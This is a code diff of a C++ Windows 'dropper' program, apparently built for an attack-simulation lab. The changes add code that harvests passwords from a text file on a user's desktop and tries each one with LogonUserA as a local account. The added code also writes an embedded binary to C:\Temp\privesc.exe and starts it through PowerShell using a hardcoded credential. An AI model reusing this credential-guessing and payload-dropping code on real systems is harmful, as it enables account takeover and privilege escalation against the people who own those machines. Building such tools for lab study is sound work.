@@ -5,26 +5,26 @@ int wmain() {
 	// TODO: simulate attacker looking for password docs with powershell
 
 	// read passwords in doc
-	std::wifstream file;
+	std::ifstream file;
 	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
-	std::vector<std::wstring> passList;
-	std::wstring pass;
+	std::vector<std::string> passList;
+	std::string pass;
 
 	if (file.is_open()) {
-		std::wstring s;
+		std::string s;
 		while (std::getline(file, s)) {
-			passList.push_back(s.substr(s.find(L":") + 2));
+			passList.push_back(s.substr(s.find(":") + 2));
 		}
 	}
 	file.close();
 
 	// attempt to authenticate as NineBall with passwords
 	HANDLE hToken = NULL;
-	for (std::wstring s : passList) {
-		std::wcout << L"\"" << s << L"\"" << std::endl;
-		if (LogonUserW(
-			L"NineBall",
-			L".",
+	for (std::string s : passList) {
+		Log("\"" + s + "\"", "dropper");
+		if (LogonUserA(
+			"NineBall",
+			".",
 			s.c_str(),
 			LOGON32_LOGON_NETWORK,
 			LOGON32_PROVIDER_DEFAULT,
@@ -36,10 +36,15 @@ int wmain() {
 	}
 
 	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
-		std::wcout << L"failed to get NineBall token" << std::endl;
+		Log("failed to get NineBall token", "dropper");
 	}
 
-	std::wcout << L"pass: \"" << pass << L"\"" << std::endl;
+	Log("pass: \"" + pass + "\"", "dropper");
+
+	// write the privesc to disk
+	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
+	outfile.write(&privesc[0], sizeof(privesc));
+	outfile.close();
 
 	// create privesc process as NineBall
 	STARTUPINFO si;
@@ -48,10 +53,17 @@ int wmain() {
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	if (!CreateProcessAsUserW(
-		hToken,
-		L"privesc.exe",
+	std::wstring cmd = 
+		L"powershell.exe -Command "
+		L"$username = 'NineBall'; "
+		L"$password = 'SuperSecurePassword1!'; "
+		L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
+		L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
+		L"Start-Process C:\\Temp\\privesc.exe -Credential $credential;";
+
+	if (!CreateProcessW(
 		NULL,
+		const_cast<LPWSTR>(cmd.c_str()),
 		NULL,
 		NULL,
 		FALSE,
@@ -61,7 +73,7 @@ int wmain() {
 		&si,
 		&pi
 	)) {
-		std::wcout << L"couldn't create privesc process" << std::endl;
+		Log("[!] Failed to create privesc process." + std::to_string(GetLastError()), "dropper");
 	}
 
 	// unsure if these will cause dropper to stay up
@@ -70,8 +82,4 @@ int wmain() {
 	CloseHandle(pi.hThread);
 
 	return 0;
-}
-
-namespace dropper {
-
 }
